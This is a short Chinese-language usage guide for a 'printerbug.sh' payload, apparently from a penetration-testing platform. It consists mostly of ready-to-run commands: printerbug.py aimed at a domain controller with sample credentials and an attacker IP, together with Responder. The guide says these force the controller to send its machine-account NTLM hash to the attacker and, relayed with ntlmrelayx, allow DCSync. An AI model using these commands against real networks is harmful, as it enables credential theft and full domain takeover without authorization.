## 📦 载荷使用说明：printerbug.sh

该载荷文件主要配合 **PrinterBug** 算子（攻击技法）使用。以下是详细的操作步骤和参数说明。

### 📝 操作步骤

1. **准备阶段**：将本载荷文件通过系统的文件管理功能或光盘摆渡方式上传至目标虚拟机或宿主机指定目录。
2. **执行阶段**：在目标环境中调用 `PrinterBug` 算子，并指定本载荷文件作为配置或脚本输入。
3. **结果验证**：观察执行日志，确认算子执行成功，并根据返回结果进行下一步渗透测试策略的制定。

### ⚙️ 参数说明

以下是本载荷涉及的核心参数及其含义（请根据实际隔离网络环境进行修改）：

**配置示例 1**：
```bash
python3 printerbug.py corp/user:Pass123@DC01 attacker_ip
```

**配置示例 2**：
```bash
# 1. 启动 Responder
python3 Responder.py -I eth0 -A

# 2. 触发 PrinterBug
python3 printerbug.py corp/user:Pass123@DC01 attacker_ip
```

### 📖 原始工具说明

以下是系统内置的原始工具说明，供参考：

## PrinterBug 强制NTLM回连

### 触发打印机漏洞
```bash
python3 printerbug.py corp/user:Pass123@DC01 attacker_ip
```

### 配合 Responder 使用
```bash
# 1. 启动 Responder
python3 Responder.py -I eth0 -A

# 2. 触发 PrinterBug
python3 printerbug.py corp/user:Pass123@DC01 attacker_ip
```

- 强制域控机器账户向攻击机发起 NTLM 认证
- ✓ 可获取域控机器账户 Hash
- 配合 ntlmrelayx 可实现 DCSync